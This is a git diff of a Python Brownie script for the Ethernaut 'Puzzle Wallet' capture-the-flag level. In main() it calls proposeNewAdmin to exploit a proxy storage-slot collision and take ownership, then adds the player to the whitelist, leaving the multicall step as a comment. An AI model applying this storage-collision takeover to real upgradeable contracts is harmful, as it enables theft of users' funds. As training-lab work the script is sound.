@@ -3,8 +3,15 @@ from scripts.helpful_scripts import get_account
 from brownie import web3, network, interface, convert, Attack24, PuzzleWallet, PuzzleProxy, Contract
 from eth_utils import keccak
 
-ETHERNAUT_INSTANCE = "0x0F29cA26b2B6E5b5442681094Edd658B87a024a5"
+ETHERNAUT_INSTANCE = "0xbfBbecD4aE33d097f5F7Edf2a6156F66322540AF"
 GAS_LIMIT = 6000000
+
+def initialise(_player, _target):
+    print(f"\nplayer address = {_player}")
+    print(f"target = {_target}")
+    proxy = Contract.from_abi(PuzzleProxy._name, ETHERNAUT_INSTANCE, PuzzleProxy.abi)
+    print(f"PuzzleProxy.pendingAdmin() = {proxy.pendingAdmin()}")
+    print(f"PuzzleProxy.admin() = {proxy.admin()}")
 
 def contract_total_balance():
      # current balance of PuzzleProxy
@@ -12,34 +19,23 @@ def contract_total_balance():
     balance_eth = web3.fromWei(balance, "ether")
     print(f"\nContract total balance in wei = {balance}\nbalance in ether = {balance_eth}\n")
 
-
-def print_status():
+def print_storage(_player, _target):
     print("\n---------------- START -----------------")
     for i in range(2):
         storage_slot = web3.eth.getStorageAt(ETHERNAUT_INSTANCE, i)
         storage_slot_hex = web3.toHex(storage_slot)
-        print(f"storage slot {i}:  {storage_slot_hex}")         # slot 0/slot 1 --> (proxy) admin addresses
+        print(f"storage slot {i}:  {storage_slot_hex}") # slot 0/slot 1 --> (proxy) admin addresses
 
-    slot_2 = web3.eth.getStorageAt(ETHERNAUT_INSTANCE, 2)       # slot 2    --> whitelist first
-    slot_2_bool = bool(slot_2)
-    print(f"storage slot 2:  {slot_2}")
+    # slot_2 = web3.eth.getStorageAt(ETHERNAUT_INSTANCE, 2)
+    # slot_2_bool = bool(slot_2)
+    # print(f"storage slot 2:  {slot_2}")
 
-    slot_3 = web3.eth.getStorageAt(ETHERNAUT_INSTANCE, 3)       # slot 3    --> whitelist second
-    slot_3_bool = bool(slot_3)
-    print(f"storage slot 3:  {slot_3}")
-
-    slot_4 = web3.eth.getStorageAt(ETHERNAUT_INSTANCE, 4)       # slot 4
-    slot_4_uint = int.from_bytes(slot_4, "big", signed="False")
-    print(f"storage slot 4:  {slot_4}")
-
-    # need 2 whitelisted address... make that work 'Address0 WL'
-    
+    player_WL = _target.whitelisted(_player, {"from": _player})
+    print(f"Player address on the whitelist: {player_WL}") 
     print("----------------- END ------------------\n")
-   
-    
+       
 """
     0x725595ba16e76ed1f6cc1e1b65a88365cc494824  <- admin address at start
-
 
     Function to print the following status message:
 
@@ -53,33 +49,27 @@ def print_status():
     Address1 balance: {uint}
     Total balance:    {uint}
     
-    ----------------- END ------------------
-    
+    ----------------- END ------------------    
 """
 
 def main():
+
+    # initalise player, target etc.    
     player = get_account()
-    print(f"\nplayer address = {player}")
     target = interface.IPuzzleWallet(ETHERNAUT_INSTANCE)
-    proxy = Contract.from_abi(PuzzleProxy._name, ETHERNAUT_INSTANCE, PuzzleProxy.abi)
-    print(f"PuzzleProxy.admin() = {proxy.admin()}")
-    # print(f"\n {PuzzleWallet.abi}")
-    print_status()
+    initialise(player, target)
     
+    print_storage(player, target)
+    
+    # player becomes the owner
     target.proposeNewAdmin(player, {"from": player})   
-    print_status()
+    print_storage(player, target)
      
+    # add player to the whitelist  
     target.addToWhitelist(player, {"from": player})
-    print_status()
+    print_storage(player, target)
 
-    whitelisted = target.whitelisted(player, {"from": player})
-    print(f"bool whitelisted = {whitelisted}")
-
-
-    # Solidity attack here ??
-
-    # proxy.addToWhiteList(player, {"from": player})
-    # print_status()
+    # Perform the multicall attack in Solidity  <-- LOOK
 
 
 """
